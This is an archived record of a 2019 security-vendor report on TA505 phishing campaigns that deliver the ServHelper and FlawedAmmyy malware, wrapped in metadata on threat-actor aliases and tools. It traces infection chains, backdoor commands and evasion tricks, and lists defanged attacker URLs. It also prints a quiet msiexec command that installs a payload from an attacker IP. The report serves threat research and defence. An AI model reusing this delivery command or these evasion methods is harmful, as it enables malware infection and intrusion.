{
    "id": "109b35f0-6538-428f-a03c-366a27bedff1",
    "created_at": "2023-01-12T15:07:46.291871Z",
    "updated_at": "2025-03-27T02:15:37.88868Z",
    "deleted_at": null,
    "sha1_hash": "e4246a259a18d9a1d5b434af9b6644da675ccecb",
    "title": "2019-08-27 - TA505 At It Again- Variety is the Spice of ServHelper and FlawedAmmyy",
    "authors": "",
    "file_creation_date": "2022-05-28T02:38:51Z",
    "file_modification_date": "2022-05-28T02:38:51Z",
    "file_size": 213817,
    "plain_text": "# TA505: Variety in Use of ServHelper and FlawedAmmyy\n\n**blog.trendmicro.com/trendlabs-security-intelligence/ta505-at-it-again-variety-is-the-spice-of-servhelper-and-**\nflawedammyy/\n\nAugust 27, 2019\n\nTA505 continues to show that as a cybercriminal group, they intend to wreak as much havoc\nwhile maximizing potential profits. Given the group's active campaigns since our updates in\n[June and](https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/) [July, we continued following their latest campaigns. Just like in previous](https://blog.trendmicro.com/trendlabs-security-intelligence/latest-spam-campaigns-from-ta505-now-using-new-malware-tools-gelup-and-flowerpippi/)\noperations, they continue to make small changes, such as targeting other countries, entities,\nor the combination of techniques used for deployment, for each campaign. Despite the\n[changes, TA505 continues to use either FlawedAmmyy RAT (remote access trojan) or](https://blog.trendmicro.com/trendlabs-security-intelligence/spam-campaign-abusing-settingcontent-ms-found-dropping-same-flawedammy-rat-distributed-by-necurs/)\nServHelper as payloads. However, over the last nine campaigns since our June report, they\nalso started using .ISO image attachments as the point of entry, as well as a .NET\ndownloader, a new style for macro delivery, a newer version of ServHelper, and a .DLL\nvariant of FlawedAmmyy downloader. The group also started targeting new countries, such\nas Turkey, Serbia, Romania, Korea, Canada, the Czech Republic, and Hungary.\n\n.ISO, enabled macros for entry dropping ServHelper or FlawedAmmyy\n\nWe noticed that the group became active again in the middle of July, targeting Turkish and\nSerbian banks with emails that had .ISO file attachments as a means of entry. While the\n[method is not new, the change in file type may yield successful infections given the unusual](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/malicious-spam-campaign-uses-iso-image-files-to-deliver-lokibot-and-nanocore)\nmalware delivery technique. Emails with an attached .ISO image is an .LNK file that uses\ncommand line msiexec to execute an MSI file from a URL such as\nhxxp://139[.]180[.]195[.]36/pm2.\n\n\n-----\n\nFigure 1. Infection chains for ServHelper installation\n\nFigure 2. A sample of an .ISO file with an embedded .LNK file\n\nThe pm2 file contains and runs another executable, which is an installer file created using\nNullsoft Scriptable Install System (NSIS), a free script-driven installer authoring tool for\nWindows. This NSIS-encapsulated file then installs ServHelper\n\n.\n\nFigure 3. .LNK shortcut in .ISO file\n\nIn another sample we obtained, we found an Excel attachment with malicious macros\nembedded in the file. The macros directly download the file created using NSIS installer from\nhxxp://45[.]67[.]229[.]36/p2, which is the same binary we found in the .ISO and .LNK files that\ninstall ServHelper.\n\nFigure 4. Email sample with an attached Excel file.\n\nIn another sample, the group made several updates with the versions of ServHelper, one of\nwhich included the strings’ binary encrypted in Vigenère cipher.\n\nFigure 5. Encrypted string\n\nWe observed that some of the samples still had errors in the cipher routine. In another\nroutine that was supposed to result in a stack overflow, it also displayed an error message.\nWe suspect the developer of this particular sample copied and pasted a stack overflow code.\n\nFigure 6. Vigenère cipher in ServHelper and the Delphi code in stack overflow\n\nAnother updated version included encrypted contents of the C&C communication via HTTP\n(previous versions had C&C request and response information in plain text). The encrypted\nsample — via XOR encoding/URL encoding — also received a response from the C&C\nencrypted with XOR. The XOR key is embedded in the binary; in this case, the key was “lol”.\n\nFigure 7. XOR Encrypted C&C communication\n\nWe also found two new backdoor commands, runmem and runmemxor, that can run\nadditional .DLL commands in memory.\n\n\n-----\n\n**_shell: Execute command_**\n**_runmem: Download .DLL in memory and run_**\n**_runmemxor: Download XOR encrypted .DLL and decrypt and run_**\n**_zakr: Register autorun_**\n**_slp: Set sleep time_**\n**_load: Download executable file and run_**\n**_loaddll: Download .DLL and run_**\n**_selfkill: Uninstall itself_**\n\nThe newer version shows that the developers behind ServHelper continued to upgrade it to\nevade detection and add more functions, possibly for even more iterations in the future. In a\ncampaign targeting thousands of Korean businesses, we found an .ISO attachment — used\nas the malicious downloader — disguised as a confirmed flight ticket from a popular airline.\n\nFigure 8. TA505 spoofing an airline company as a malicious file attachment.\n\nIn a slightly different technique still targeting Korean enterprises, the .ISO files either\ncontained an .LNK file such as the previous iteration, or a .NET-compiled downloader.\n\nFigure 9. Infection chains for FlawedAmmyy installation\n\nFigure 10. Screenshot of decompiled script from the .ISO file with a .NET downloader\nembedded in the e-ticket.\n\nOther samples also included an Excel file attachment with malicious macros that install\nFlawedAmmyy, or a URL included in the email that supposedly downloads the file needed to\ndownload the malware.\n\nFigure 11. .LNK embedded in the .ISO file\n\nBoth versions tried to download and execute files km1 or km2, an .MSI installer that\nexecutes the FlawedAmmyy downloader. This, in turn, downloads an RC4-encrypted\nFlawedAmmyy RAT payload from hxxp://92[.]38[.]135[.]67/2.dat or\nhxxp://27[.]102[.]70[.]196/1.dat that automatically decrypts and executes the malware. This\n[was also previously documented by an ESET security researcher. On the samples that used](https://blog.alyac.co.kr/2437)\na URL in the email content, we also noticed that the type of document file that it downloaded\ndepended on the URL that the user opened. Opening the documents will enable the macros\nand download the same FlawedAmmyy downloader as the .ISO file iteration from\n\n\n-----\n\nhxxp://92[.]38[.]135[.]67 or hxxp://27[.]102[.]70[.]196, with filenames k1 or k2. In a campaign\nthat targeted Romanian banks, emails used the subject “Fw: copie COC L5H3” and came\nwith an .ISO image attachment.\n\nFigure 12. Infection chains for ServHelper installation with .NET downloader\n\nFurther analysis revealed a .NET downloader embedded in the image, along with routines\nthat were almost similar to those used in the campaign observed targeting Turkish banks.\nThe .NET downloads jm1 — an .MSI installer — that installs another NSIS installer, leading\nto a ServHelper infection in the system.\n\nFigure 13. The decompiled .NET downloader\n\nIn another routine, an Excel file attachment downloads the NSIS installer once the user\nenables the malicious macros from hxxp://109[.]234[.]37[.]15:80/j1 or\nhxxp://169[.]239[.]128[.]170/j1. Both URLs contain the same binaries as the ones that the\n_jm1 file installs._\n\nMore typical TA505 campaigns, with old and new targets\n\nThe group's more typical payload and routine involves the use of ServHelper and\nFlawedAmmy RAT and attaching a document embedded with malicious commands and\nstrings. One variant targets Serbian banks with subjects pertaining to “payments” or\n“invoices” applicable in several European languages. Enabling the macros of the Excel file\ndownloads a file created using NSIS installer with ServHelper from 79[.]141[.]168[.]105 or\n195[.]123[.]213[.]126. We found another routine from a campaign targeting government\nagencies in Saudi Arabia, Oman, and Qatar with another type of .XLS or .DOC attachment.\nThe emails used in these campaigns used subjects pertaining to finance or urgent concerns\non insurance policies. A similar campaign targeting Turkish educational and government\ninstitutions used email subjects pertaining to invoice information or personnel payroll, and\nVisual Basic for Applications (VBA) .XLS or VBA .DOC macros. Similar to the routine variant\nin Figure 6, the Excel VBA macros retrieve the FlawedAmmyy downloader from\nhxxp://195[.]123[.]245[.]185/r1 or hxxp://185[.]225[.]17[.]5/r1, in then decrypts and executes\nFlawedAmmyy RAT from hxxp://185[.]225[.]17[.]5/2.dat or hxxp://195[.]123[.]245[.]185/1.dat.\nMeanwhile, the .DOC VBA macros retrieves the MSI files from hxxp://195.123.245.185/km or\nhxxp://185.225.17.5/km, which executes the NSIS installer for ServHelper installation. Similar\nto one of the routines depicted in Figure 9, the group also reused one of the email samples\nbut changed the targets to India and the United States, and added content referring to\ninvoices. The email may contain different documents, but the URLs for downloading\nServHelper as the payload remain the same.\n\n\n-----\n\nFigure 14. One of the more typical techniques employed by TA505.\n\n.DLL downloaders that deliver FlawedAmmyy and newly styled macros\n\nIn the first week of August, we noticed the group using a different approach and style to fetch\nthe downloaders via macros. While FlawedAmmyy RAT was still the final payload, the\ndownloader was different — this operation used a .DLL variant. This particular campaign\ntargeted Canada with subjects asking for confirmation of numbers from the marketing\ndepartment.\n\nFigure 15. Infection chain with .DLL FlawedAmmyy downloader\n\nThe attached document asks the user to enable the macros, which creates an Internet\nExplorer object instance. This loads a text file from a hardcoded website, wherein the content\nof the document file is parsed through and the inner text of the document is loaded. Our\nanalysis showed that this is likely done so the malicious file can bypass some firewall rules,\nsince the communication uses Internet Explorer.\n\nFigure 16. Sample document with malicious macros.\n\nFigure 17. Text file using Internet Explorer for communication to bypass firewall rules.\n\nThe downloaded file is a text file with a single number on each line. The macros process the\ndownloaded payload with each number encrypted in XOR with a constant hardcoded value\nof 106. The result is an executable file written to the disc and executed.\n\nFigure 18. Executable file written to disk and executed\n\nThe executed .DLL is packed using two layers: a custom packer for the first stage and UPX\n(Ultimate Packer for Executables) for the second stage. The unpacked payload in memory is\nalso a .DLL — it's the first time we've seen a FlawedAmmyy downloader as a .DLL. As we\nfurther analyzed the main behavior by downloading the encrypted FlawedAmmyy RAT and\ndecrypted it with RC4, we found that it was similar to the previous campaigns, but with a few\nupdates. The first update is the use of the socket API to send an HTTP request instead of\n_wininet or winhttp API to download an encrypted FlawedAmmyy, building an HTTP header by_\nitself. This could likely be an effort to bypass API hooking for HTTP.\n\nFigure 19. Send HTTP request using socket API\n\n\n-----\n\nThe second change: The decrypted FlawedAmmyy RAT is now saved as dllhots.exe in\n_C:\\temp\\ (it used to be saved as wsus.exe). Lastly, this new FlawedAmmyy downloader_\noverwrites some PE header members with random values. Specifically, it overwrites the\nchecksum, the address of relocation table in DOS header, and the checksum in optional\nheaders.\n\nFigure 20. Original PE header members (left) vs. overwritten header members (right)\n\nThe decrypted FlawedAmmyy RAT slightly different from the one that TA505 reused over its\npast campaigns. While the previous strings had the modified AmmyyAdmin binary since the\nsource code was leaked, TA505 changed the strings in this sample to PopssAdmin. This may\nbypass detection rules if the systems’ lists were not updated.\n\nFigure 21. Significant changes in the binary\n\nIn another sample targeting South Korea, the difference with the previous case is the XOR\nencryption hardcoded at 180. We also found that the file delivered is an .MSI executable\ncontaining the same .DLL FlawedAmmyy downloader. From the document embedded with\nthe malicious macros, the macro code calls “Run” on the WScript.Shell object. Most of the\nstrings forming the final command are stored in the “Tag” properties of a form embedded in\nthe document.\n\nFigure 22. Sample document in Korean asking the user to enable the macros.\n\nFigure 23. Final command strings in document’s “tag” properties.\n\nThe final command executes the download and installation of the .MSI file into\n_C:\\Windows\\System32\\msiexec.exe\" back=13 error=continue /i_\n_http://92[.]38[.]135[.]99/99.msi /q OnLoad=\"c:\\windows\\notepad.exe_\n\nFigure 24. .MSI file installed in the system\n\nFrom the parameters above, “/i” means install, “/q” means quiet. The other three parameters\ndo not appear to be used at all, as reported in the install log (by adding /L*V\n**\"C:\\example.log\" parameter). The .MSI file is a downloader with the .DLL FlawedAmmyy**\ndownloader inside; it retrieves the final payload, then decrypts and executes FlawedAmmyy\nRAT.\n\n\n-----\n\nFigure 25. Unused parameters from log\n\nAround the second week of August, we found a campaign targeting banks in the Czech\nRepublic with subjects pertaining to credit and NAV transfer. Analysis of the samples\nrevealed that the document and macro style was similar to the Korean campaign that\nused.MSI files, but this campaign downloads from hxxp://185[.]17[.]122[.]220/555.msi or\nhxxp://159[.]69[.]54[.]146/555.msi. This .MSI file delivers the NSIS-packed ServHelper, and\nthe binary shares the same C&C server as the campaign targeting Saudi Arabia, Oman,\nQatar, and Turkey.\n\nSuspicious activity using ServHelper\n\nA campaign targeting China spoofed FedEx-themed emails with subjects pertaining to\ndelivery problems, failures, or notifications. Instead of attachments, it had malicious URLs in\nthe message content that lead to the download of a malicious document named fedex.doc\nfrom hxxp://www.fedexdocs[.]top/fedex.doc or hxxp://www.fedexdocs[.]icu/fedex.doc. The\nVBA macro in the document downloads an NSIS-packed executable from\nhxxps://senddocs[.]icu/stelar.exe, which installs ServHelper. However, while initial analysis of\nthe macro it used made us believe that this was from TA505, the macros’ obfuscation and\n[style turned out to be more similar to the ones described in this post, based on the code](https://blog.trendmicro.com/trendlabs-security-intelligence/shifting-tactics-breaking-down-ta505-groups-use-of-html-rats-and-other-techniques-in-latest-campaigns/)\npage, senders, and fast flux. This particular campaign did not match TA505’s technique.\nThus we suspect that other cybercriminals purchased or borrowed ServHelper from the\nunderground market for this campaign.\n\nConclusion\n\nA number of ServHelper samples can be found in the wild, but some do not appear to be\n[attributed to TA505. One such sample (reported by a researcher that used the Twitter handle](https://twitter.com/James_inthe_box/status/1158484189685010432)\nJames_inthe_box), delivered Remcos, seemingly with a TA505 pattern. However, we think it\nmay be more likely that ServHelper is sold to other malicious actors and tested on possible\ntargets. In the long run, as more changes are added to the malware, this can make\nattribution to specific groups more difficult.\n\nThe changes and adjustments that TA505 made from the original ServHelper and\nFlawedAmmyy routines may indicate that the group is experimenting and testing to\ndetermine which forms of obfuscation can bypass detections, resulting in more financial\nreturns. It's also possible that the changes in target countries and industries are driven by the\ngroup’s customers; targeting new victims and even returning to previously targeted countries\nand organizations with new techniques. This also gives TA505 more data on which types of\nfiles can be further used for detection evasion, or even to deter attribution.\n\n\n-----\n\nGiven the frequency of changes in routines and deployment from our previous articles, we\ncan expect TA505 to come up with more methods for payload delivery, malware types, and\ncombinations of previously used and new routines. Further, as the malware is still being\nupgraded, more iterations can be expected in the future. If not removed completely,\nmalicious actors can still take control of computers, peripherals, sensitive information, and\nproprietary data.\n\nAs they continue to target businesses in different sectors, we can expect TA505 to keep\nusing phishing and social engineering techniques to compromise systems. Enterprises are\n[advised to strengthen their online systems, especially email gateways. Enforce the principle](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/infosec-guide-email-threats)\nof least privilege, as well as a patch management and system update procedure to make\nsure the entire network is protected. Install redundant and multilayered protection systems\nfrom the gateway to the endpoint that can detect and block malicious URLS, emails, and\nattachments, as well as [proactively monitor other possible attack vectors.](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/infosec-guide-domain-monitoring-detecting-phishing-attacks)\n\nEnterprises can consider Trend Micro™ endpoint solutions such as Trend Micro Smart\nProtection Suites and [Worry-Free™ Business Security. Both solutions can protect users and](https://www.trendmicro.com/en_us/small-business/worry-free.html)\nbusinesses from threats by detecting malicious files and spammed messages as well as\n[blocking all related malicious URLs. Trend Micro Deep Discovery™ has an email inspection](https://www.trendmicro.com/en_us/business/products/network/advanced-threat-protection.html)\nlayer that can protect enterprises by detecting malicious attachments and URLs. Trend\nMicro™ Hosted Email Security is a no-maintenance cloud solution that delivers continuously\nupdated protection to stop spam, malware, spear phishing, ransomware, and advanced\ntargeted attacks before they reach the network. It protects Microsoft Exchange, Microsoft\nOffice 365, Google Apps, and other hosted and on-premises email solutions. The indicators\n[of compromise (IoCs) related to these campaigns we observed are in this appendix.](https://documents.trendmicro.com/assets/pdf/APPENDIX_TA505-At-It-Again.pdf)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-27 - TA505 At It Again- Variety is the Spice of ServHelper and FlawedAmmyy.pdf"
    ],
    "report_names": [
        "2019-08-27 - TA505 At It Again- Variety is the Spice of ServHelper and FlawedAmmyy.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536066,
    "ts_updated_at": 1743041737,
    "ts_creation_date": 1653705531,
    "ts_modification_date": 1653705531,
    "files": {
        "pdf": "https://archive.orkl.eu/e4246a259a18d9a1d5b434af9b6644da675ccecb.pdf",
        "text": "https://archive.orkl.eu/e4246a259a18d9a1d5b434af9b6644da675ccecb.txt",
        "img": "https://archive.orkl.eu/e4246a259a18d9a1d5b434af9b6644da675ccecb.jpg"
    }
}